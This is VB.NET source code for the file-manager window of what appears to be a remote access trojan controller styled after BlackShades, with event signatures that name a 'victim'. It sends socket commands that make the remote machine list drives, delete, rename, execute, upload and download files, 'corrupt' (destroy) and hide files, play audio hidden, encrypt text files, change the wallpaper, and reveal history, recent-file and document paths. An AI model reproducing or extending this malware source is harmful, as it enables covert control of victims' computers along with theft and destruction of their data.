﻿Imports System.Threading
Public Class fm
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Public sock As Integer
    Public yy As String = "||"

    Private Sub fm_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Form1.s.Send(sock, "GetDrives" & "||")
    End Sub
    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If
            RefreshList()
        End If

    End Sub
    Public Sub RefreshList()
        Form1.s.Send(sock, "FileManager" & "||" & TextBox1.Text)
    End Sub
    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.s.Send(sock, "Delete||Folder||" & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.s.Send(sock, "Delete||File||" & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub RunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunToolStripMenuItem.Click
        Form1.s.Send(sock, "Execute||" & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.s.Send(sock, "Rename||Folder||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & a)
                Case Else
                    Form1.s.Send(sock, "Rename||File||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & a)
            End Select
        End If
        RefreshList()

    End Sub
    Private Sub UpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UpToolStripMenuItem.Click

        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            For Each x As ListViewItem In Form1.l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "sendfileto" & "||" & TextBox1.Text & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
            RefreshList()
        End If
    End Sub

    Private Sub OpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpToolStripMenuItem.Click
        System.Diagnostics.Process.Start(Application.StartupPath & "/Computers")
    End Sub

    Private Sub DownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "downloadfile" & "||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & ListView1.FocusedItem.Text)
        Next
    End Sub
    Private Sub NewFolderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The folder's Name", "Creat New Folder")
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "creatnewfolder" & "||" & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub

    Private Sub DestroyFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DestroyFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "corrupt" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub HideFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "hidefolderfile" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "showfolderfile" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub PlayMusicInHiddenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PlayMusicInHiddenToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "playmusic" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.s.Send(sock, "GetDrives" & "||")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If

    End Sub

    Private Sub ViweeditTextFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ViweeditTextFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "edittextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub NewTextFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewTextFileToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The Text File's Name", "Creat New Text File")
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "creatnewtextfile" & yy & TextBox1.Text & n & ".txt")
        Next
        RefreshList()
    End Sub

    Private Sub CrypteDecryptTextToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CrypteDecryptTextToolStripMenuItem.Click
        If Not (ListView1.FocusedItem.Text.EndsWith(".exe") Or ListView1.FocusedItem.Text.EndsWith(".EXE")) Then
            For Each x As ListViewItem In Form1.l1.SelectedItems
                Form1.s.Send(sock, "cryptedecryptetextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Next
        Else
            MsgBox("Please Do Not Select an Executable File", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SetAsWallpaperToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "setaswallpaper" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowPicToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowPicToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "viewimage" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub
    Private Sub DecToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DecToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "Comrar" & Form1.yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub CompressRARToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CompressRARToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "Comrar" & Form1.yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        ListView1.View = View.SmallIcon
    End Sub

    Private Sub BlackShadesNetButton2_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton2.Click
        ListView1.View = View.Details
        RefreshList()
    End Sub

    Private Sub BlackShadesNetButton3_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton3.Click
        ListView1.View = View.List
    End Sub


    Private Sub BlackShadesNetButton4_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton4.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getstartuppath")
        Next
    End Sub

    Private Sub BlackShadesNetButton5_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton5.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getrecentpath")
        Next
    End Sub

    Private Sub BlackShadesNetButton7_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton7.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "gethistorypath")
        Next
    End Sub

    Private Sub BlackShadesNetButton6_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton6.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getdesktoppath")
        Next
    End Sub

    Private Sub BlackShadesNetButton9_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton9.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "gettemppath")
        Next
    End Sub

    Private Sub BlackShadesNetButton8_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton8.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getmydocumentspath")
        Next
    End Sub

    Private Sub BlackShadesNetButton11_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton11.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getmymusicpath")
        Next
    End Sub

    Private Sub BlackShadesNetButton10_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton10.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getmyimagespath")
        Next
    End Sub
End Class